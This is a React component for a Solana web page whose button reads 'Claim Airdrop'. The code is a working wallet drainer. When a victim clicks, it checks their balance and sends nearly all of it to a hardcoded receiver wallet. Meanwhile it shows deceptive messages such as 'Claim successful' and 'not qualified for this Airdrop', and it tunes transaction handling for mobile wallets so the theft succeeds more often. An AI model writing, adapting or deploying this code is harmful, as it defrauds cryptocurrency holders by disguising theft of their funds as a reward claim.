// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';

// Detect mobile browser
const isMobile = () =>
  typeof navigator !== 'undefined' &&
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction, wallet, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction || !connected) return;

    setLoading(true);
    try {
      const connection = new Connection(RPC_URL, {
        commitment: 'confirmed',
        wsEndpoint: false,
      });

      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const FEE_SAFETY = 5_000_000; // 0.005 SOL
      const totalReserve = rentExempt + FEE_SAFETY;
      const transferAmount = balance - totalReserve;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // Fetch blockhash as late as possible
      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('finalized');

      const transferIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: RECEIVER_WALLET,
        lamports: transferAmount,
      });

      // Check if wallet supports versioned transactions
      // Mobile wallets (Trust, some Phantom mobile) often only support legacy
      const supportsVersioned =
        wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;

      let transaction;
      if (supportsVersioned && !isMobile()) {
        // Desktop + wallet supports V0 → use VersionedTransaction
        const messageV0 = new TransactionMessage({
          payerKey: publicKey,
          recentBlockhash: blockhash,
          instructions: [transferIx],
        }).compileToV0Message();
        transaction = new VersionedTransaction(messageV0);
      } else {
        // Mobile or wallet doesn't support V0 → use legacy Transaction
        transaction = new Transaction({
          feePayer: publicKey,
          recentBlockhash: blockhash,
        }).add(transferIx);
      }

      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: true,
        maxRetries: 5,
      });

      console.log('⏳ Transaction sent:', signature);

      // On mobile, the app-switch may interrupt polling.
      // Show the signature immediately so the user has proof.
      if (isMobile()) {
        alert(`Claim submitted!\nTx: ${signature}\n\nYour transaction has been sent. It may take a moment to confirm.`);
      }

      // Poll for confirmation over HTTP
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              if (!isMobile()) {
                alert(`Claim successful!\nTx: ${signature}`);
              }
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying...', pollErr);
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      if (!isMobile()) {
        alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
      }
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, wallet, connected]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
